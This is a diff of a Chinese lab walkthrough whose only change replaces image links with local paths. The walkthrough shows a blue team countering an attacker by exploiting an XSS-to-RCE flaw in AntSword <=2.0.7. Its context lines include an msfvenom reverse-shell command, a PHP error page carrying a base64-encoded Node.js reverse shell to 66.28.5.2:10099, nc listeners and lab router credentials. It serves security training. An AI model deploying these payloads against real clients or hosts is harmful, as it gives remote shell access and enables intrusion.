@@ -63,7 +63,7 @@ previous_referenced_identifiers: ""
 
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/thLttnT09Qr53bTKejw5BA)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZMNib9xnvZvqay2LIQVxLqC86xw1Sfr6nzyAkQvHSZ2ibT3joNkpdhMdg/640?wx_fmt=png)
+![](../../.resource/remote/d82d0390401db5d82061ab86282b3eac9630ca782bffafadd5b9c04676a81d85.png)
 
 **Zero**
 
@@ -74,7 +74,7 @@ previous_referenced_identifiers: ""
 中国蚁剑是一款开源的跨平台网站管理工具，它主要面向于合法授权的渗透测试安全人员以及进行常规操作的网站管理员。  
 2019 年 4 月 12 日凌晨，有用户在中国蚁剑 GitHub 上提交了 issue，称发现中国蚁剑存在 XSS 漏洞，借此可引起 RCE。据悉，该漏洞是因为在 webshell 远程连接失败时，中国蚁剑会返回错误信息，但因为使用的是 html 解析，导致 xss 漏洞。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZMNib9xnvZvqay2LIQVxLqC86xw1Sfr6nzyAkQvHSZ2ibT3joNkpdhMdg/640?wx_fmt=png)
+![](../../.resource/remote/d82d0390401db5d82061ab86282b3eac9630ca782bffafadd5b9c04676a81d85.png)
 
 **One**
 
@@ -84,7 +84,7 @@ previous_referenced_identifiers: ""
 
 AntSword <=2.0.7
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZMNib9xnvZvqay2LIQVxLqC86xw1Sfr6nzyAkQvHSZ2ibT3joNkpdhMdg/640?wx_fmt=png)
+![](../../.resource/remote/d82d0390401db5d82061ab86282b3eac9630ca782bffafadd5b9c04676a81d85.png)
 
 **Two**
 
@@ -94,7 +94,7 @@ AntSword <=2.0.7
 
 ### **●****环境拓扑**
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZ10Qc7VcQHZoFbXt8iaw6NEkxRgjCaj09xnxFG5QdftypV5QxH5QSUcQ/640?wx_fmt=png)
+![](../../.resource/remote/c71248608a16459f34d99a24ea7f8e09b6c4729d85748c7fee641713c37d6563.png)
 
 ### **●****安装 v2.0.7 版本蚁剑**
 
@@ -105,41 +105,41 @@ AntSword <=2.0.7
 
 1. 将压缩包解压，解压之后。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZkrdk6cG5SVSSQFaOFkMxzmgaVQO01dOrnJ9uN49j1ppDA5VibgSiaPCg/640?wx_fmt=png)
+![](../../.resource/remote/d09d0a6affed524e289a64633a5fbad91533d6e36a0810f0489707b45353f96a.png)
 
 2. 打开启动器, 选择 windows 版本，双击 AntSword.exe 启动文件。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZKpiblOdeOTSia8751GdTOK69Nuls1QEniaoXd1sYVx10VGmuict4CUc3jQ/640?wx_fmt=png)
+![](../../.resource/remote/3e601f025e32c284b4e2ad22a73d54be1e1f95e374ae1206f08c3745240cdfc5.png)
 
 3. 初始化, 配置核心源代码文件位置。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZzMwFOAZ5MNvmhNQIRylt3oqKYDYe3yPiapaC6tX6neiaaU8knU0ec7SA/640?wx_fmt=png)
+![](../../.resource/remote/226884bf6e96f6632b1014c17339354b4c052ad2adae5214323fd787a9069f80.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZ6TLsORtvLADCHF9ZdDU2FQXjG3nhD1uyHibsMOa0ibibWprIiaK4iaEpXPg/640?wx_fmt=png)
+![](../../.resource/remote/a4ea3e890d455eef10f73d03b7de09f91310180d653a1d0207bf0ff386cbb580.png)
 
 4. 双击 AntSword.exe 重启。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZwZADd3GoEiaCPUMVmtfKnEbMBzxb4iaXUz6Cq5kgOjOzfMRwNLGbyLyA/640?wx_fmt=png)
+![](../../.resource/remote/49935d5051e311148195620e7ba2ebbb0a8328458fe9df24a51a65d1ed94c2a5.png)
 
 ### **●****蓝队靶标 Centos 7**
 
 Centos 7 自动获取到的 IP 地址为 10.10.19.50  
 1. 在靶机上搭建 LAMP 服务和 phpcms v9.6.0 环境。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZ8JBEtEn6SNibUVkpqpuiabXBerliajFSDK78Q21AnQcr2Bc5eROephdyQ/640?wx_fmt=png)
+![](../../.resource/remote/105a1936c14f629a118bc442ad7b2d47d96dc4e6277bc8d2a4d9d8d872f71289.png)
 
 2. 边界 FW2 防火墙开放对应的接口  
 访问 http://1.1.1.12/cgi-bin/luci/，输入 root/goktech 进行登录。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZeyzWU38omkBql2Jl2KqSZZ84apadmkVtykDDAAypBlAcs3KqcmicicXg/640?wx_fmt=png)
+![](../../.resource/remote/945b8a26c5712e24ed05cdc53834d3ab1a36ef1765a17cd74b711b661214621c.png)
 
 点击 “网络 -> 防火墙 ->端口转发 ->新增”，则可以添加新的端口转发规则。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZ4yCRg0xoGWf5XJSnfXbGHibt0VhS12GWibqPMLluTFaNsUqMSz3KkFnw/640?wx_fmt=png)
+![](../../.resource/remote/57d3be354266ad3cc59e9b1ff01f63f191c0b219d4b51ac00278aa7e2924483c.png)
 
 设置新的端口转发规则。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZBXU1AafhOgFDlGHj2uf9yXjVicBdVM8MA5iccicE7Zm9rAFBQztA3CsrA/640?wx_fmt=png)
+![](../../.resource/remote/8654878383658962f89ee86893e93f86f4a24f082f4dae0f314983eb1bf9c784.png)
 
 > 名称：可以任意取名，建议与规则相关；  
 > 协议：可以选择 TCP、UDP、ICMP，一个规则最好只选一个协议，不然容易出问题；  
@@ -151,39 +151,39 @@ Centos 7 自动获取到的 IP 地址为 10.10.19.50
 
 配置完成后点击右下角保存，即可增加规则，但规则不会马上生效。规则是自上而下进行匹配的，可以按住规则右侧的白色按钮上下拖动调整顺序，最后点击 “保存并应用” 方可生效。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZiagJ3sCoo5DgplTMNzfP78TEL4b09Yo97iaicm8TooSyy9EYv1G3lMOBg/640?wx_fmt=png)
+![](../../.resource/remote/464b332c86d69ea73e33481342ea592f2619b36456e893dfbdfa111d312e8a04.png)
 
 **●****蓝队靶标 Windows Server 2016**  
 
 Windows Server 2016 自动获取到的 IP 地址是 10.10.19.51  
 1. 使用 phpstudy 搭建，启动 nginx+mysql 服务。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZHic2USDibus1vfwndRdp8GbWHPNyOpbj4nHbcfIhqp0FlyNZPtb15fOQ/640?wx_fmt=png)
+![](../../.resource/remote/2b0d5f583ebb450e2b5336a8eee4a0f215b185022dfa8bb38dbe4e9ecfe9e2bc.png)
 
 2. 搭建好 phpcms v9.6.0 环境。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZ20c5Lib8vJNKoo5uoYWdrklyOYdfZ4C6HsLKLFMEKtBvFiawcKicxgW9g/640?wx_fmt=png)
+![](../../.resource/remote/9f69a32dab5f80d998e091fae1a3c620a11e0e6459e68126ce67d27911302248.png)
 
 3. 边界 FW2 防火墙开放对应的接口  
 访问 http://1.1.1.12/cgi-bin/luci/，输入 root/goktech 进行登录。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZeyzWU38omkBql2Jl2KqSZZ84apadmkVtykDDAAypBlAcs3KqcmicicXg/640?wx_fmt=png)
+![](../../.resource/remote/945b8a26c5712e24ed05cdc53834d3ab1a36ef1765a17cd74b711b661214621c.png)
 
 点击 “网络 -> 防火墙 ->端口转发 ->新增”，则可以添加新的端口转发规则。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZ4yCRg0xoGWf5XJSnfXbGHibt0VhS12GWibqPMLluTFaNsUqMSz3KkFnw/640?wx_fmt=png)
+![](../../.resource/remote/57d3be354266ad3cc59e9b1ff01f63f191c0b219d4b51ac00278aa7e2924483c.png)
 
 设置新的端口转发规则。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZS4SCvdJpJEsk7PfPz1NGopMPza53wBI6cRHX5Uru4d0unpSvBsI7Kw/640?wx_fmt=png)
+![](../../.resource/remote/5d11da7527e997e3f940bd378f7a08d70b1df2672a8166d87642a22989f9d167.png)
 
 > 将靶标 Windows Server 2016 上的 phpcms 平台映射到公网 66.28.5.2 的 80 端口上
 
 配置完成后点击右下角保存，即可增加规则，但规则不会马上生效。规则是自上而下进行匹配的，可以按住规则右侧的白色按钮上下拖动调整顺序，最后点击 “保存并应用” 方可生效。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZOJKd6QffkCKEDKSVOBPYxr7NvVTd5zMUibp0olMC2CLH7h01iaNYDBtA/640?wx_fmt=png)
+![](../../.resource/remote/ed1a603d621623a22508ba6a28e8a71809133ff17130b8951961c7caf572b48c.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZMNib9xnvZvqay2LIQVxLqC86xw1Sfr6nzyAkQvHSZ2ibT3joNkpdhMdg/640?wx_fmt=png)
+![](../../.resource/remote/d82d0390401db5d82061ab86282b3eac9630ca782bffafadd5b9c04676a81d85.png)
 
 **Three**
 
@@ -197,26 +197,26 @@ Windows Server 2016 自动获取到的 IP 地址是 10.10.19.51
 
 1. 红队通过 phpcms v9.6.0 文件上传漏洞，上传了一句话木马文件，并且使用蚁剑成功连接。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZpVurzvg255mvdLcssVuerE6RictPhZnyVnutc37ZJwywfuc6AcqzFsA/640?wx_fmt=png)
+![](../../.resource/remote/3041c457cd6c4c06b6ba7b43d3dfb6ef6b8ba5bfa51d756fe8f68367a3d0a713.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZfNvGic0cbx68ScLNr70ZSszHJe7tEmv7eHeicEvXe4p9Mp78s75PibuMA/640?wx_fmt=png)
+![](../../.resource/remote/56b06f5992ff0df2f8e34ac17027e311c5ba4d49dc069f0755892762e3d476cc.png)
 
 2. 蓝队 Centos 7 ：关闭防火墙。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZ2jDibE6s2iatgLvgeMokBiavxpGyiag15nvanyIKLloKecdVaotrwZo2LA/640?wx_fmt=png)
+![](../../.resource/remote/6fa6e8884e40ec7ee005eb84adac3296aa6e69e32f4f2183b19b5329b726bcc2.png)
 
 3. 边界 FW2 防火墙开放接口  
 访问 http://1.1.1.12/cgi-bin/luci/，输入 root/goktech 进行登录。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZeyzWU38omkBql2Jl2KqSZZ84apadmkVtykDDAAypBlAcs3KqcmicicXg/640?wx_fmt=png)
+![](../../.resource/remote/945b8a26c5712e24ed05cdc53834d3ab1a36ef1765a17cd74b711b661214621c.png)
 
 点击 “网络 -> 防火墙 ->端口转发”，则可以看到端口转发规则。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZUic7TiamdccYAI36fKjiaxt8S8wqP00ribBJaeicrXI4Iib8v6j0feLhjk3Q/640?wx_fmt=png)
+![](../../.resource/remote/158082a795a2f951f5b3190b1bf79c7a58d86a4c7f9520ac593268d8f95375e3.png)
 
 点击 “编辑”，进入修改端口转发规则。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZUUcpWgvydd0HID1AoCUyd3k8Qp2rQVpguW2OwrkytyZFNrCKst5Wkw/640?wx_fmt=png)
+![](../../.resource/remote/b4161c2b4b97c82d974c4672bc13475243fa85fba597e81af30ff592e8c9b9bb.png)
 
 配置完成后点击右下角保存，即可修改规则，最后点击 “保存并应用” 方可生效。
 
@@ -224,34 +224,34 @@ Windows Server 2016 自动获取到的 IP 地址是 10.10.19.51
 
 1. 红队通过 phpcms v9.6.0 文件上传漏洞，上传了一句话木马文件，并且使用蚁剑成功连接。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZwp4HrKeprNB0uIFXQ56CrXLAdUUObqh2gNibHt1T7ibjSSha2UIzr6rw/640?wx_fmt=png)
+![](../../.resource/remote/1699cd0c414cd0528943a3f42aabcf9faa9bb18ab3e05572455af34aca5fb131.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZkeI3j9JjfmGuKJkr8B1R1ByjicSM6q18X0ZTwRldrVJcU0MBDttkicRw/640?wx_fmt=png)
+![](../../.resource/remote/664e084b8b7fb7813e7d46aafe8a52f615e3f36949fbfd19dc46dc820b3f9561.png)
 
 2. 蓝队 Windows Server 2016：关闭防火墙。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZl6sliaoUu7aakPNTRK9hRX8USdtjGSDRPrkJyEq8vQiamZw6G0XB0OtA/640?wx_fmt=png)
+![](../../.resource/remote/25a6e81a926870a1cf3b21c8f748cc7646dc287ed9523fb82bf48be87c5a1294.png)
 
 3. 边界 FW2 防火墙开放接口  
 访问 http://1.1.1.12/cgi-bin/luci/，输入 root/goktech 进行登录。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZeyzWU38omkBql2Jl2KqSZZ84apadmkVtykDDAAypBlAcs3KqcmicicXg/640?wx_fmt=png)
+![](../../.resource/remote/945b8a26c5712e24ed05cdc53834d3ab1a36ef1765a17cd74b711b661214621c.png)
 
 点击 “网络 -> 防火墙 ->端口转发”，则可以看到端口转发规则。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZMwC5ReltydHR6oWQWcdBAZNQsVbhHSyw9rsXfNoHfcK9agG2sNiciaPw/640?wx_fmt=png)
+![](../../.resource/remote/d2dccf5e194faf80587ba9ff7f9a8c76ebdce41c3f89c430e03c5320a7133ecc.png)
 
 点击 “编辑”，进入修改端口转发规则。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZ6t1C7fUkeqhCBjQCduFs1KKsUYqKHoH6eFb3O7ZLuIm8ekFMP2m1jA/640?wx_fmt=png)
+![](../../.resource/remote/23effb2d8c8e84352f19575b2977d1822ee8d0fad2f09fcd09306cab450f2211.png)
 
 配置完成后点击右下角保存，即可修改规则，最后点击 “保存并应用” 方可生效。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZXCtiaS6hekOU5TVkKAhhuoAf2E9XL1qej46eScibchFQSmz7JqRokhOQ/640?wx_fmt=png)
+![](../../.resource/remote/82e2525241cc00f98e95c0114f1e9a702782c41546be0fe389573e2cb3149853.png)
 
 4. 红队 Windows 10 关闭杀毒软件，比如火绒、360 等等。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZPxFyb4PXzZjsvLaNVKJqfqhq2NDh96BwpUnWzRKldbllh6iamPAic1Bw/640?wx_fmt=png)
+![](../../.resource/remote/a0c7413888dda46fe8ed8f64ac10a73817b848dbe8b0e5bfdc433c4faeec17f1.png)
 
 > 如果没有关闭火绒，则会报僵尸网络攻击，并将攻击进行拦截。
 
@@ -265,11 +265,11 @@ Windows Server 2016 自动获取到的 IP 地址是 10.10.19.51
 
 1. 蓝队检查日志时，发现红队使用蚁剑 v2.0 连接了 20220609050516861.php。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZhwZmAV0tUBzBUn3SlBYsdLdvMIwDBOic1e0Sl4NFNMmzh5SjSe545BQ/640?wx_fmt=png)
+![](../../.resource/remote/6934ed77a543b4e4dd6a721dd066e05afa858155a27cbe6fadbc3ebd5fa1f6d7.png)
 
 2. 查看 20220609050516861.php，发现该文件是一句话木马文件。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZMRFPFUq00JVM92yTGicrfZCsfpe59H7eTjKSEZLH8Mx5V7rfibib2PpdA/640?wx_fmt=png)
+![](../../.resource/remote/8c4032e44c9faf82ac5fa124589616f7f1049fce462401128f28b8b37eb7f5c3.png)
 
 ### ****●******反制过程**
 
@@ -296,11 +296,11 @@ var net = require("net"), sh = require("child_process").exec("cmd.exe");var clie
 
 > msfvenom -p nodejs/shell_reverse_tcp LHOST=66.28.5.2 LPORT=10099 -f raw -o payload.js
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZxwSiahES2qERKPY0ez3zqqicziaTNUyMkGbOYxjJDzBmPqyNFv1icQ2JfA/640?wx_fmt=png)
+![](../../.resource/remote/bf3d0caf0d5783373f6a0c22a7fd9a3a124396bb50a86b0df8936bed1d6fca50.png)
 
 将 payload.js 中的内容进行 base64 编码，将 base64 编码完成的代码放进 Buffer 函数。  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZzmrOkfHibngq9fCibnn0UWh9ibDR9eAXb92Kq0BqVeKCYeibRu3eL6TvHA/640?wx_fmt=png)
+![](../../.resource/remote/3d703bc15de211aab41192086cd101237f694ce9d8de0e15f20c89b94c243019.png)
 
 ```
 <?phpheader("HTTP/1.1 500 Not <img src=# onerror='eval(new Buffer(`KGZ1bmN0aW9uKCl7IHZhciByZXF1aXJlID0gZ2xvYmFsLnJlcXVpcmUgfHwgZ2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZDsgaWYgKCFyZXF1aXJlKSByZXR1cm47IHZhciBjbWQgPSAoZ2xvYmFsLnByb2Nlc3MucGxhdGZvcm0ubWF0Y2goL153aW4vaSkpID8gImNtZCIgOiAiL2Jpbi9zaCI7IHZhciBuZXQgPSByZXF1aXJlKCJuZXQiKSwgY3AgPSByZXF1aXJlKCJjaGlsZF9wcm9jZXNzIiksIHV0aWwgPSByZXF1aXJlKCJ1dGlsIiksIHNoID0gY3Auc3Bhd24oY21kLCBbXSk7IHZhciBjbGllbnQgPSB0aGlzOyB2YXIgY291bnRlcj0wOyBmdW5jdGlvbiBTdGFnZXJSZXBlYXQoKXsgY2xpZW50LnNvY2tldCA9IG5ldC5jb25uZWN0KDEwMDk5LCAiNjYuMjguNS4yIiwgZnVuY3Rpb24oKSB7IGNsaWVudC5zb2NrZXQucGlwZShzaC5zdGRpbik7IGlmICh0eXBlb2YgdXRpbC5wdW1wID09PSAidW5kZWZpbmVkIikgeyBzaC5zdGRvdXQucGlwZShjbGllbnQuc29ja2V0KTsgc2guc3RkZXJyLnBpcGUoY2xpZW50LnNvY2tldCk7IH0gZWxzZSB7IHV0aWwucHVtcChzaC5zdGRvdXQsIGNsaWVudC5zb2NrZXQpOyB1dGlsLnB1bXAoc2guc3RkZXJyLCBjbGllbnQuc29ja2V0KTsgfSB9KTsgc29ja2V0Lm9uKCJlcnJvciIsIGZ1bmN0aW9uKGVycm9yKSB7IGNvdW50ZXIrKzsgaWYoY291bnRlcjw9IDEwKXsgc2V0VGltZW91dChmdW5jdGlvbigpIHsgU3RhZ2VyUmVwZWF0KCk7fSwgNSoxMDAwKTsgfSBlbHNlIHByb2Nlc3MuZXhpdCgpOyB9KTsgfSBTdGFnZXJSZXBlYXQoKTsgfSkoKTs=`,`base64`).toString())'>");?>
@@ -309,13 +309,13 @@ var net = require("net"), sh = require("child_process").exec("cmd.exe");var clie
 2. 开启监听端口  
 蓝队使用 nc 开启监听 10099 端口。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZjiciaI5RGd5u91jJ7l01icxVdRQNYre9bdKLZuVP0vvEov2qtibQLML9CA/640?wx_fmt=png)
+![](../../.resource/remote/d9966bb5f24aee78d410aec06a47ef6b069b0fcedd0af635e7260b007df394b5.png)
 
 3. 当红队再一次使用蚁剑进行连接 webshell 时，发现报错，可能以为自己的密码错了或者木马文件没了，而此时，红队已经被蓝队控制了。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZTzap7E9HCyEVeXmve2T0cGJxCdiapMwK4iaJ5JTV0iaNMJRXLxMdEjQCg/640?wx_fmt=png)
+![](../../.resource/remote/1044101763f5b7ba047c09cbf03e0feb6aaf3e66041863256d160425a00a4092.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZibDql2MQDL67LS2B7zqTGanwibBX11Py8NTdV2XgHSp6K6vxSETuFa1A/640?wx_fmt=png)
+![](../../.resource/remote/c16ee53ec101a05cf095da9a7816eb93ab58c0e505e21936736d4a70c777230c.png)
 
 ### ****●******Windows Server 2016**
 
@@ -337,15 +337,15 @@ var net = require("net"), sh = require("child_process").exec("cmd.exe");var clie
 2. 开启监听端口  
 蓝队靶机使用 nc 开启监听 10088 端口。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZudplmLOMGrqGcibA21puIVbqYKwMbyVSoYxC1jl4QSczOEj5AuWEcGg/640?wx_fmt=png)
+![](../../.resource/remote/db68679a5d00308abf72e3a5dae7141e239c112672438ef40d08cbdda8ea144b.png)
 
 3. 当红队再一次使用蚁剑进行连接 webshell 时，发现报错，可能以为自己的密码错了或者木马文件没了，而此时，红队已经被蓝队控制了。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZ0Wqia1JA9FicqpVwjoxBPibZ7724FflmkOZDHDWFK4TMQh0m6wk6t5xow/640?wx_fmt=png)
+![](../../.resource/remote/add7b8d5c8e23a3616e96691307f290c4fd6bb81f5f544b149cec06a8e295a58.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZdJy7keZbaAjD3OG2Db13hzL5LGzjw8JNTnbBibS5llLCez6LpbPhPoA/640?wx_fmt=png)
+![](../../.resource/remote/31daad778d4a3c4a6939ed89384914fe0c070192b97414062b5cd6b08aab4038.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZMNib9xnvZvqay2LIQVxLqC86xw1Sfr6nzyAkQvHSZ2ibT3joNkpdhMdg/640?wx_fmt=png)
+![](../../.resource/remote/d82d0390401db5d82061ab86282b3eac9630ca782bffafadd5b9c04676a81d85.png)
 
 **Four**
 
